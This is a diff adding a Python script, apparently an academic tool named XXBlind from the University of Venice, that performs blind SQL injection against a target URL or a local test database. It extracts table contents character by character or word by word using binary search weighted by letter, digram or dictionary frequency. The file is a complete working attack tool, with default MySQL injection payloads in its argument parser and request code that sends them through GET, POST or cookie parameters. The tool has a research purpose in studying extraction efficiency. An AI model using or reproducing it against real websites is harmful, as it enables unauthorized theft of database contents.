@@ -1,0 +1,655 @@
+#!/usr/bin/env python
+
+"""XXBlind, eXtremely fast data eXtraction via blind SQL injection."""
+
+from __future__ import division
+import sys
+import re
+import time
+import string
+import urllib
+import urllib2
+import argparse
+import MySQLdb
+import threading
+import Queue
+import curses 
+from collections import namedtuple
+
+__authors__     = ["Riccardo Focardi <focardi at dais.unive.it>",
+                   "Flaminia Luccio  <luccio at unive.it>",
+                   "Marco Squarcina  <msquarci at dais.unive.it>"]
+__license__     =  "MIT"
+__copyright__   =  "Copyright 2012, University of Venice"
+__status__      =  "Development"
+__version__     =  "0.9"
+
+# global variables
+
+N        = 128
+chars    = 0
+queries  = 0
+lock     = threading.Lock()
+freq     = None
+optimize = 0
+threads  = 1
+quiet    = False
+
+# class definitions
+
+class Job:
+    number, char, word, separator = range(4)
+
+class Worker(threading.Thread):
+    def __init__(self, tasks, request, query, table, jobtype):
+        threading.Thread.__init__(self)
+        self.tasks   = tasks
+        self.request = request
+        self.query   = query
+        self.table   = table
+        self.jobtype = jobtype
+
+    def run(self):
+        while True:
+            job = self.tasks.get()
+            if job == None:
+                # poison pill received, now die
+                self.tasks.task_done()
+                break
+            if self.jobtype == Job.number:
+                # extract a number, don't care about frequency
+                extract = ExtractNum(self.request, self.query, self.table)
+            elif self.jobtype == Job.word:
+                # extract a word
+                extract = ExtractWord(self.request, self.query, self.table)
+            elif self.jobtype == Job.separator:
+                # find separators on a given row
+                extract = ExtractSep(self.request, self.query, self.table)
+            else:
+                # extract a character
+                extract = ExtractChar(self.request, self.query, self.table)
+
+            data = extract(*job)
+            with lock:
+                if self.jobtype == Job.separator or data.val == 0:
+                    # nothing to do if the value is 0 or if we're extracting seps
+                    pass
+                if self.jobtype == Job.number:
+                    # retrieving row length
+                    self.table.rows[data.row] = Row(data.val)
+                elif self.jobtype == Job.char or self.jobtype == Job.word:
+                    # add a char or word to the table
+                    self.table.add(data)
+            self.tasks.task_done()
+        return
+
+class Extract:
+    def __init__(self, request, query, table):
+        self.request    = request
+        self.query      = query
+        self.table      = table
+
+    def bin_search(self, low, high):
+        """Performs a binary search by using the '<' comparison operator only."""
+
+        while high != low:
+            mid = self.partition(low, high)
+            if self.request(self.query.replace('%%%CHAR%%%', str(mid))):
+                low = mid+1
+            else:
+                high = mid
+        return high
+
+class ExtractChar(Extract):
+    def __call__(self, row, col):
+        global chars
+
+        self.row = row
+        self.col = col
+        try:
+            if self.table.rows[row].length < col:
+                return Char(row, col, None)
+        except KeyError:
+            pass
+
+        self.query = self.query.replace('%%%ROW%%%', str(row))
+        self.query = self.query.replace('%%%COL%%%', str(col))
+
+        if optimize == 0:
+            val = self.lin_search()
+        else:
+            val = self.bin_search(0, N)
+        if val != 0:
+            with lock:
+                chars += 1
+
+        return Char(row, col, val)
+
+    def lin_search(self):
+        """Performs a linear search on printable uppercase characters."""
+        
+        for c in string.uppercase + string.whitespace + string.digits + string.punctuation:
+            if self.request(self.query.replace('%%%CHAR%%%', str(ord(c)))):
+                return ord(c)
+
+    def partition(self, low, high):
+        """Partition by returning the index that slices the value list into two
+        subsets of the same weight or length."""
+
+        if optimize == 1:
+            # perform a classical binary search
+            return (low + high) // 2
+        elif optimize == 3 and self.col > 2:
+            try:
+                # optimize using digrams freq
+                occurrences = freq.digrams[self.table.table[self.row][self.col-1]]
+            except KeyError:
+                occurrences = freq.letters
+        else:
+            # optimize using letters freq
+            occurrences = freq.letters
+
+        nchars_tot = sum(occurrences[low:high])
+        nchars = 0
+        if(nchars_tot == 0):
+            return (low + high) // 2
+        while nchars < (nchars_tot // 2 + 1):
+            nchars += occurrences[low]
+            low += 1
+
+        return low-1
+   
+class ExtractSep(Extract):
+    def __call__(self, row, idx, length):
+        self.row = row
+        self.query = self.query.replace('%%%ROW%%%', str(self.row))
+        self.search(idx, length)
+
+    def search(self, idx, length):
+        global chars
+
+        query = self.query.replace('%%%IDX%%%', str(idx))
+        query = query.replace('%%%LENGTH%%%', str(length))
+
+        found = self.request(query)
+        if found:
+            # there is at least one separator in the provided interval
+            if length == 1:
+                self.table.table[self.row][idx] = ord(' ')
+                self.table.rows[self.row].seps.append(idx)
+                with lock:
+                    chars += 1
+                return
+            else:
+                self.search(idx, length//2)
+                self.search(idx + length//2, length - length//2)
+
+class ExtractWord(Extract):
+    def __call__(self, row, idx, length):
+        global chars
+
+        self.row = row
+
+        self.query = self.query.replace('%%%ROW%%%', str(row))
+        self.query = self.query.replace('%%%IDX%%%', str(idx))
+        self.query = self.query.replace('%%%LENGTH%%%', str(length))
+
+        self.dictionary = filter(lambda word: len(word[0]) == length, freq.words)
+        # when the filtered dictionary is empty we are not able to catch the
+        # word.. let's just return some '?'
+        if len(self.dictionary) == 0:
+            return Word(row, idx, '?'*length)
+        val = self.bin_search(0, len(self.dictionary))
+        with lock:
+            chars += len(val)
+        return Word(row, idx, val)
+
+    def bin_search(self, low, high):
+        """Returns a word starting at index 'start' by performing a binary search on the words list"""
+
+        while high != low:
+            mid = self.partition(low, high)
+            if self.request(self.query.replace('%%%WORD%%%', self.dictionary[mid][0])):
+                high = mid
+            else:
+                low = mid+1
+        return self.dictionary[high][0]
+
+    def partition(self, low, high):
+        """Returns the index that split the ordered word list into two lists of
+        the same weight"""
+
+        nwords_tot = sum([w[1] for w in self.dictionary[low:high]])
+        nwords = 0
+        while nwords < (nwords_tot // 2 + 1):
+            nwords += self.dictionary[low][1]
+            low += 1
+        return low-1
+
+class ExtractNum(Extract):
+    def __call__(self, row, col):
+        self.row = row
+        self.col = col
+        try:
+            if self.table.rows[row] < col:
+                return Char(row, col, 0)
+        except KeyError:
+            pass
+
+        self.query = self.query.replace('%%%ROW%%%', str(row))
+        self.query = self.query.replace('%%%COL%%%', str(col))
+
+        # start searching between 0 and 32
+        val = self.search(0, 32)
+        return Char(row, col, val)
+
+    def search(self, low, high):
+        while self.request(self.query.replace('%%%CHAR%%%', str(high))):
+            low = high
+            high *= 2
+        return self.bin_search(low, high)
+
+    def partition(self, low, high):
+        return (low + high) // 2
+
+class LocalRequest:
+    def __init__(self, host, user, pwd, dbname):
+        self.db = MySQLdb.connect(host, user, pwd, dbname)
+
+    def __call__(self, query):
+        global queries
+        with lock:
+            queries += 1
+        cursor = self.db.cursor()
+        cursor.execute(query)
+        return cursor.fetchone()
+        #return cursor > 0
+
+    def __del__(self):
+        self.db.close()
+
+class RemoteRequest:
+    # [TODO] add support for other parameters, i.e. user-agent or referrer
+    def __init__(self, url, get, post, cookie, success):
+        self.url     = url
+        self.get     = get
+        self.post    = post
+        self.cookie  = cookie
+        self.success = success
+
+    def __call__(self, query):
+        global queries
+
+        with lock:
+            queries += 1
+
+        self.query = query
+        user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
+        headers = {'User-Agent': user_agent}
+
+        get = ""
+        if self.get:
+            get = "?" + self.urlencode(self.get)
+        if self.post:
+            post = self.urlencode(self.post)
+            request = urllib2.Request(self.url + get, post)
+        else:
+            request = urllib2.Request(self.url + get)
+        if self.cookie:
+            request.add_header('Cookie', self.update(self.cookie))
+        f = urllib2.urlopen(request)
+        page = f.read()
+        f.close()
+        # check if our query has succeeded
+        return self.success in page
+
+    def urlencode(self, params):
+        params_dict = {self.update(param.split('=')[0]): self.update(param.split('=')[1]) for param in params}
+        return urllib.urlencode(params_dict)
+
+    def update(self, var):
+        return var.replace("%%%QUERY%%%", self.query)
+
+class Frequency:
+    def __init__(self, text=None, dictionary=None):
+        self.text       = text
+        self.dictionary = dictionary
+        self.letters    = None
+        self.digrams    = None
+        self.words      = None
+
+    def compute_letters(self):
+        self.letters = [0 for i in range(N)]
+        for c in self.text:
+            self.letters[ord(c)] += 1
+    
+    def compute_digrams(self):
+        self.digrams = [[0 for i in range(N) ] for j in range(N)]
+        for i in range(len(self.text)-1):
+            self.digrams[ord(self.text[i])][ord(self.text[i+1])] += 1
+
+    def compute_words(self):
+        sample_dictionary = {}
+        sample_words = ''.join([c for c in list(self.text) if not c in string.punctuation]).split()
+        for word in sample_words:
+            try:
+                sample_dictionary[word] += 1
+            except KeyError:
+                sample_dictionary[word] = 1
+        self.words = []
+        for word in sorted(sample_dictionary):
+            self.words.append((word, sample_dictionary[word]))
+        if self.dictionary:
+            dictionary_words = ''.join([c for c in list(self.dictionary) if not c in string.punctuation]).split()
+            # fill missing words setting occurrence = 1
+            for word in set(dictionary_words):
+                if not word in sample_dictionary:
+                    self.words.append((word, 1))
+            self.words = sorted(self.words, key=lambda word: word[0])
+
+class Query:
+    def __init__(self, query, qrowlen, qrownum, qwords, qseps, table, fields, filtr):
+        self.table   = table
+        self.fields  = fields
+        self.filtr   = ""
+        if filtr:
+            self.filtr = filtr
+        self.query   = self.update(query)
+        self.qrowlen = self.update(qrowlen)
+        self.qrownum = self.update(qrownum)
+        self.qwords  = self.update(qwords)
+        self.qseps   = self.update(qseps)
+
+    def update(self, val):
+        return val.replace("%%%TABLE%%%", self.table).replace("%%%FIELDS%%%", self.fields).replace("%%%FILTER%%%", self.filtr)
+
+class Row:
+    def __init__(self, length):
+        self.length = length
+        self.seps = []
+        self.intervals = []
+        
+class Table:
+    def __init__(self, separator_chars):
+        self.table   = {}
+        self.rows  = {}
+        self.row_num = 0
+        self.separator_chars = separator_chars
+
+    def add(self, data):
+        if isinstance(data, Char):
+            self.table[data.row][data.col] = data.val
+        elif isinstance(data, Word):
+            for i in range(len(data.val)):
+                self.table[data.row][data.col + i] = ord(data.val[i])
+
+    def get_rownum(self, request, query):
+        """Retrieves the total number of rows."""
+
+        extract = ExtractNum(request, query, self)
+        self.row_num = extract(0, 0).val
+
+    def get_rowlen(self, request, query):
+        """Retrieves the table rows by executing multiple SQLi."""
+
+        tasks = Queue.Queue()
+        # fill the work queue
+        for row in range(self.row_num):
+            # initialize the dict structure of each row
+            self.table[row] = {}
+            tasks.put((row,0))
+        # poison pills the queue
+        for _ in xrange(threads):
+            tasks.put(None)
+        # start threads
+        for _ in range(threads):
+            worker = Worker(tasks, request, query, self, Job.number)
+            worker.setDaemon(True)
+            worker.start()
+        tasks.join()
+
+    def get_seps(self, request, query):
+
+        # extend the basic query to locate all the provided separators
+        full_query = ""
+        for i in range(len(self.separator_chars) - 1):
+            full_query += query.replace('%%%SEPARATOR%%%', self.separator_chars[i]) + " OR "
+        full_query += query.replace('%%%SEPARATOR%%%', self.separator_chars[-1])
+
+        tasks = Queue.Queue()
+        # fill the work queue
+        for row in self.rows:
+            tasks.put((row, 1, self.rows[row].length))
+        # poison pills the queue
+        for _ in xrange(threads):
+            tasks.put(None)
+        # start threads
+        for _ in range(threads):
+            worker = Worker(tasks, request, full_query, self, Job.separator)
+            worker.setDaemon(True)
+            worker.start()
+        tasks.join()
+
+    def set_intervals(self):
+        for row in self.rows:
+            seps = [0] + self.rows[row].seps + [self.rows[row].length + 1]
+            for i in range(len(seps) - 1):
+                if (seps[i+1] - seps[i]) > 1:
+                    self.rows[row].intervals.append((seps[i] + 1, seps[i+1] - seps[i] - 1))
+
+    def get_chars(self, request, query):
+        """Retrieves the data stored in the DB char-by-char."""
+
+        tasks = Queue.Queue()
+        # fill the work queue 
+        for row in self.rows:
+            for col in range(1,self.rows[row].length+1):
+                tasks.put((row, col))
+        # add some poison pills
+        for _ in xrange(threads):
+            tasks.put(None)
+        # start threads
+        for _ in range(threads):
+            worker = Worker(tasks, request, query, self, Job.char)
+            worker.start()
+        tasks.join()
+
+    def get_words(self, request, query):
+        """Retrieves the data stored in the DB word-by-word."""
+
+        tasks = Queue.Queue()
+        # fill the work queue 
+        for row in self.rows:
+            # extract word by word
+            for interval in self.rows[row].intervals:
+                tasks.put((row, interval[0], interval[1]))
+        # add some poison pills
+        for _ in xrange(threads):
+            tasks.put(None)
+        # start threads
+        for _ in range(threads):
+            worker = Worker(tasks, request, query, self, Job.word)
+            worker.start()
+        tasks.join()
+
+    def get_data(self, request, query):
+        if optimize == 4:
+            self.get_words(request, query.qwords)
+        else:
+            self.get_chars(request, query.query)
+
+    def __str__(self):
+        table = []
+        for row_num, row in sorted(self.table.iteritems()):
+            for col_num, char in sorted(row.iteritems()):
+                try:
+                    table.append(chr(char))
+                except:
+                    # most likely, an error in the remote request happened
+                    table.append('?')
+            table.append('\n')
+        return ''.join(table)
+
+class Char:
+    def __init__(self, row, col, val):
+        self.row = row
+        self.col = col
+        self.val = val
+
+    def __str__(self):
+        return chr(self.val)
+
+class Word:
+    def __init__(self, row, col, val):
+        self.row = row
+        self.col = col
+        self.val = val
+
+    def __str__(self):
+        return self.val
+
+def die(msg):
+    sys.stderr.write("[!] " + msg)
+    sys.exit(1)
+
+def notice(msg):
+    if not quiet:
+        print("[*] " + msg)
+
+def main():
+    global optimize, freq, threads, quiet
+
+    parser = argparse.ArgumentParser(description='Optimizated data retrieval via blind SQLi')
+    parser.add_argument('-U', '--upper', action='store_true', help='if specified, parse the uppercase version of sample file')
+    parser.add_argument('-i', '--quiet', action='store_true', help='turn off output', default=False)
+    parser.add_argument('-c', '--cookie', type=str, help='pass the data as a cookie')
+    parser.add_argument('-y', '--success', type=str, help='look for this string in the HTML page in case of SQLi success',
+        default="not available at the moment")
+    parser.add_argument('-s', '--sample', type=argparse.FileType('r'),
+        help='specify a sample text to parse for collecting statistical informations')
+    parser.add_argument('-d', '--dictionary', type=argparse.FileType('r'),
+        help='specify a dictionary file to fill missing words in the sample file')
+    parser.add_argument('-O', '--optimize', type=int, choices=(0,1,2,3,4), default=1,
+        help='perform an optimized binary search. Use 0 for no optimization (linear search), 1 for binary search, 2 for binary search using letters frequency, 3 for binary search using digrams frequency and 4 for dictionary search')
+    parser.add_argument('-q', '--query', type=str, help='specify a query for character extraction',
+        default="%%%CHAR%%%<(SELECT ORD(UPPER(MID(CONCAT(%%%FIELDS%%%),%%%COL%%%,1))) FROM %%%TABLE%%% %%%FILTER%%% LIMIT %%%ROW%%%,1)")
+    parser.add_argument('-Q', '--qrowlen', type=str, help='specify a query for extracting row length',
+        default="%%%CHAR%%%<(SELECT LENGTH(CONCAT(%%%FIELDS%%%)) FROM %%%TABLE%%% %%%FILTER%%% LIMIT %%%ROW%%%,1)")
+    parser.add_argument('-R', '--qrownum', type=str, help='specify a query for extracting the number of rows',
+        default="%%%CHAR%%%<(SELECT COUNT(CONCAT(%%%FIELDS%%%)) FROM %%%TABLE%%% %%%FILTER%%%)")
+    parser.add_argument('-S', '--qseps', type=str, help='specify a query for extracting the position of separators in each row',
+        default="0 != (SELECT LOCATE('%%%SEPARATOR%%%', SUBSTR(CONCAT(%%%FIELDS%%%), %%%IDX%%%, %%%LENGTH%%%)) FROM %%%TABLE%%% %%%FILTER%%% LIMIT %%%ROW%%%,1)")
+    parser.add_argument('-W', '--qwords', type=str, help='specify a query for words extraction',
+        default="1 != STRCMP((SELECT SUBSTR(%%%FIELDS%%%,%%%IDX%%%,%%%LENGTH%%%) from %%%TABLE%%% %%%FILTER%%% LIMIT %%%ROW%%%,1), '%%%WORD%%%')");
+    parser.add_argument('-F', '--filter', type=str, help='specify one or more conditions in every query')
+    parser.add_argument('-e', '--separators', type=str, help='specify the separators',
+        default=" \t;.,:")
+    parser.add_argument('-t', '--table', type=str, help='specify a table', required=True)
+    parser.add_argument('-f', '--fields', type=str, help='specify one or more fields to dump', required=True)
+    parser.add_argument('-T', '--threads', type=int, help='specify the maximum number of concurrent threads', default=1)
+    parser.add_argument('-v', '--version', action='version', version='%(prog)s-'+__version__)
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('-u', '--url', type=str, help='target url')
+    parser.add_argument('-g', '--get', nargs='*', type=str, help='define a list of GET variables')
+    parser.add_argument('-p', '--post', nargs='*', type=str, help='define a list of POST variables')
+    group.add_argument('-l', '--localdb', type=str,
+        help='target db for simulation purposes. Pass parameters for connecting in the form of host:user:pwd:dbname')
+    args = parser.parse_args()
+   
+    # set global variables
+    optimize = args.optimize
+    threads  = args.threads
+    quiet    = args.quiet
+
+    # create the Query object
+    query = Query(args.query, args.qrowlen, args.qrownum, args.qwords, args.qseps, args.table, args.fields, args.filter)
+
+    # check if we want to perform a local request or a remote one
+    if args.url:
+        request = RemoteRequest(args.url, args.get, args.post, args.cookie, args.success)
+    else:
+        # in case of local request, there's no way to perform concurrent
+        # accesses to the db
+        if threads > 1:
+            die("It's not possible to execute multiple threads on a local db. Aborting...\n")
+        request = LocalRequest(*args.localdb.split(':'))
+
+    # create the Table object that will describe the extracted table
+    table = Table(args.separators)
+    # find the total number of rows
+    table.get_rownum(request, query.qrownum)
+    if table.row_num == 0:
+        # no rows, something is wrong
+        die("Something is wrong...\n")
+    # for each rows, find its length
+    table.get_rowlen(request, query.qrowlen)
+    
+    # parse a sample text, if provided, and initialize a Frequency object
+    # containing occurrence informations for each letter and digrams. Than,
+    # extract the data.
+    text = None
+    dictionary = None
+
+    # set start time
+    time_start = time.time()
+
+    if not args.sample:
+        if optimize == 0:
+            notice("Performing linear search")
+        elif optimize == 1:
+            notice("Performing binary search")
+        else:
+            die("Sample text not specified!\n")
+    else:
+        if args.upper:
+            text = args.sample.read().upper()
+        else:
+            text = args.sample.read()
+        if args.dictionary:
+            if args.upper:
+                dictionary = args.dictionary.read().upper()
+            else:
+                dictionary = args.dictionary.read()
+            args.sample.close()
+        args.sample.close()
+
+        freq = Frequency(text, dictionary)
+
+        if optimize == 2:
+            notice("Performing binary search using letters frequency")
+            freq.compute_letters()
+        elif optimize == 3:
+            notice("Performing binary search using digrams and letters frequency")
+            freq.compute_letters()
+            freq.compute_digrams()
+        elif args.optimize == 4:
+            notice("Performing dictionary search")
+            freq.compute_words()
+            notice("Getting separator positions")
+            table.get_seps(request, query.qseps)
+            table.set_intervals()
+
+        else:
+            die("Sample text specified, wrong optimization level detected!\n")
+    
+    table.get_data(request, query)
+
+    # compute total run time
+    time_tot = time.time() - time_start
+
+    # close local db connection
+    del(request)
+    if not quiet:
+        notice("Extracted data")
+        print("-"*32)
+        print(table)
+        print("-"*32)
+
+    if chars > 0:
+        print("Total time (s): {}\nParallel threads: {}\nTotal queries: {}, Total chars: {}\nQueries/Chars ratio: {}"
+              .format(time_tot, threads, queries, chars, queries/chars))
+
+    sys.exit(0)
+
+if __name__ == '__main__':
+    main()
